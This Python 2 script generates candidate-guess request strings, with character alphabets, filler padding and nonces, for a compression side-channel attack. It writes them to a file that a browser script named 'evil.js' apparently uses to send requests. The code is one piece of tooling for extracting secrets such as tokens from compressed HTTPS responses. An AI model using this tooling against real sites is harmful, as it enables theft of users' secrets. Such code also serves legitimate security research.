import sys
import user_input

def initialize():
    '''
    Initialize global variables.
    '''
    global digit, lowercase, uppercase, dashes, nonce_1, nonce_2, method_functions
    digit = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    lowercase = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    uppercase = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    dashes = ['-', '_']
    nonce_1 = 'ladbfsk!'
    nonce_2 = 'znq'
    method_functions = {
        's': serial_execution,
        'p': parallel_execution
    }

def create_alphabet(alpha_types):
    '''
    Create array with the alphabet we are testing.
    '''
    alphabet = []
    for t in alpha_types:
        if t == 'n':
            for i in digit:
                alphabet.append(i)
        if t == 'l':
            for i in lowercase:
                alphabet.append(i)
        if t == 'u':
            for i in uppercase:
                alphabet.append(i)
        if t == 'd':
            for i in dashes:
                alphabet.append(i)
    assert alphabet, 'Invalid alphabet types'
    return alphabet;

def huffman_point(alphabet, test_points):
    '''
    Use Huffman fixed point.
    '''
    huffman = ''
    for alpha_item in enumerate(alphabet):
        if alpha_item[1] not in test_points:
                huffman = huffman + alpha_item[1] + '_'
    return huffman

def serial_execution(alphabet, prefix):
    '''
    Create request list for serial method.
    '''
    global reflection_alphabet
    req_list = []
    for i in xrange(len(alphabet)):
        huffman = huffman_point(alphabet, [alphabet[i]])
        req_list.append(huffman + prefix + alphabet[i])
    reflection_alphabet = alphabet
    return req_list

def parallel_execution(alphabet, prefix):
    '''
    Create request list for parallel method.
    '''
    global reflection_alphabet
    if len(alphabet) % 2:
        alphabet.append('^')
    first_half = alphabet[::2]
    first_huffman = huffman_point(alphabet, first_half)
    second_half = alphabet[1::2]
    second_huffman = huffman_point(alphabet, second_half)
    head = ''
    tail = ''
    for i in xrange(len(alphabet)/2):
        head = head + prefix + first_half[i] + ' '
        tail = tail + prefix + second_half[i] + ' '
    reflection_alphabet = [head, tail]
    return [first_huffman + head, second_huffman + tail]

def create_request_file(args_dict):
    '''
    Create the 'request' file used by evil.js to issue the requests.
    '''
    initialize();
    prefix = args_dict['prefix']
    method = args_dict['method']
    search_alphabet = args_dict['alphabet'] if 'alphabet' in args_dict else create_alphabet(args_dict['alpha_types'])
    with open('request.txt', 'w') as f:
        f.write(prefix + '\n')
        total_tests = []
        alphabet = method_functions[method](search_alphabet, prefix)
        for test in alphabet:
            huffman_nonce = huffman_point(alphabet, test)
            search_string = nonce_1 + test + nonce_2
            total_tests.append(search_string)
        f.write(','.join(total_tests))
        f.close()
    return reflection_alphabet

if __name__ == '__main__':
    args_dict = user_input.get_arguments_dict(sys.argv)
    create_request_file(args_dict)
